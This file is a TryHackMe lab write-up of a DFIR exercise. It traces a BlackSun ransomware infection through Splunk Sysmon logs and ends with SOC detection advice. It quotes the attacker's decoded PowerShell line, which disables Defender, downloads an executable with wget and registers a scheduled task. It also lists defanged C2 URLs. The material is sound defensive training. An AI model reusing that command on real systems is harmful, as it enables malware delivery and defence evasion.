@@ -1,0 +1,97 @@
+# Room Name - TryHackMe: PS Eclipse
+Date: 31 August 2026
+Difficulty: Easy
+Category: DFIR / SIEM / Splunk / Ransomware Analysis
+
+# Scenario
+A customer submitted a request to investigate events on Keegan's machine on Monday 16 May 2022. The machine was operational but some files had an unexpected file extension, raising concerns about a ransomware attempt. As a SOC analyst for TryNotHackMe, the task was to investigate Splunk events to determine what occurred on the device, trace the attack chain from initial download through to ransomware execution and file encryption.
+
+# Tools Used
+- TryHackMe Attack Box
+- Splunk (Sysmon Operational logs)
+- VirusTotal (hash lookup)
+- CyberChef (Base64 decoder)
+
+# What I Did
+
+**Step 1 — Identify the suspicious binary**
+- Queried Splunk for outbound connections to the known malicious IP and filtered for executable file names:
+```
+* DestinationIp="3.17.7.232" Image:"*_*.*"
+```
+- Identified the suspicious binary downloaded to the endpoint.
+
+**Step 2 — Recover the download URL**
+- Found a PowerShell process creation event with a Base64-encoded command line argument.
+- Decoded the -enc parameter using CyberChef to reveal the full PowerShell command:
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true;
+wget http://<redacted>/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;
+SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" ...;
+SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"
+```
+- Extracted and defanged the download URL from the decoded command.
+
+**Step 3 — Identify the Windows executable used for download**
+- Reviewed the Sysmon EventCode 1 (process creation) event for the PowerShell execution.
+- Confirmed the full path of the executable used to download the suspicious binary from the Image field of the event.
+
+**Step 4 — Find the scheduled task creation command**
+- Queried Splunk for the schtasks.exe command line used to register the binary:
+```
+* CommandLine="\"C:\\Windows\\system32\\schtasks.exe\" /Create /TN OUTSTANDING_GUTTER.exe ..."
+```
+- Extracted the full schtasks /Create command line from the event.
+
+**Step 5 — Confirm elevated privileges and the run command**
+- Identified the /RU SYSTEM flag in the scheduled task creation command, confirming the binary was configured to run as NT AUTHORITY\SYSTEM.
+- Found the corresponding schtasks /Run command used to trigger execution.
+
+**Step 6 — Identify the C2 connection**
+- Queried Splunk for DNS queries from the infected host:
+```
+* QueryName="9030-181-215-214-32.ngrok.io"
+```
+- Confirmed the remote C2 address the suspicious binary connected to and defanged the URL.
+
+**Step 7 — Find the downloaded PowerShell script**
+- Queried Splunk for script-related file events in the same Temp directory.
+- Found a Sysmon EventCode 23 (file delete archived) event showing a PowerShell script written then deleted from C:\Windows\Temp\.
+- Extracted the script filename from the TargetFilename field.
+
+**Step 8 — Identify the actual malware name**
+- Took the SHA256 hash from the deleted script's Sysmon event and submitted it to VirusTotal.
+- VirusTotal identified the script's actual malware name from threat intelligence.
+
+**Step 9 — Find the ransomware note path**
+- Queried Splunk for file creation events referencing the ransomware family name:
+```
+* BlackSun
+```
+- Found a Sysmon EventCode 11 (file created) event showing the ransom note written to the victim's Downloads folder, running as NT AUTHORITY\SYSTEM.
+
+**Step 10 — Find the ransomware wallpaper image path**
+- From the same BlackSun query results, identified a second Sysmon EventCode 11 event showing a JPEG image file written to the Public Pictures folder, used to replace the desktop wallpaper as a ransomware notification.
+
+# What I Found
+- Suspicious binary name: OUTSTANDING_GUTTER.exe
+- Download URL (defanged): hxxp[://]886e-181-215-214-32[.]ngrok[.]io
+- Windows executable used for download: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Scheduled task creation command: `[redacted]`
+- Permissions and run command: NT AUTHORITY\SYSTEM; `[redacted]`
+- C2 connection URL (defanged): hxxp[://]9030-181-215-214-32[.]ngrok[.]io
+- Downloaded PowerShell script name: script.ps1
+- Actual malware name: BlackSun.ps1
+- Ransom note full path: C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt
+- Wallpaper image full path: C:\Users\Public\Pictures\blacksun.jpg
+
+# Key Learning
+This investigation demonstrated a complete ransomware delivery chain traceable entirely through Sysmon logs in Splunk. The attacker used a Base64-encoded PowerShell command to simultaneously disable Windows Defender real-time monitoring, download the payload via wget, and register a scheduled task to run the binary as SYSTEM — all in a single command execution. Decoding -enc arguments from PowerShell process creation events is a fundamental SOC skill because Base64 encoding is one of the most common obfuscation techniques used to hide malicious command lines from casual log inspection. VirusTotal hash lookups on deleted or renamed scripts can surface the true malware family name even when the file has been cleaned up from disk.
+
+# What I Would Flag in a Real SOC
+- Set-MpPreference -DisableRealtimeMonitoring $true executed from a user session is a critical defence evasion indicator (MITRE T1562.001) and should trigger an immediate alert and endpoint isolation regardless of the user's privilege level
+- Wget or Invoke-WebRequest downloading an executable to C:\Windows\Temp from an ngrok tunnel domain is a high-confidence malware staging indicator, ngrok domains should be monitored and any executable download from them treated as presumed malicious
+- A scheduled task created with /RU SYSTEM and triggered by a custom Application EventID (777) is a persistence and privilege escalation mechanism that should be detected by EventID 4698 (scheduled task created) correlated with the originating process
+- Outbound connections from a newly downloaded executable to a second ngrok domain confirm C2 establishment and should trigger network-level blocking and host isolation
+- The ransomware note and wallpaper image being written by a PowerShell process running as SYSTEM confirm successful ransomware execution, at this point the incident response priority shifts to containment, backup integrity verification, and scope assessment across the network
+- Sysmon EventCode 23 (file deleted and archived) capturing the deletion of script.ps1 shows the attacker attempted to remove forensic evidence, the archived copy retained by Sysmon is a critical artefact that should be immediately preserved and submitted for malware analysis
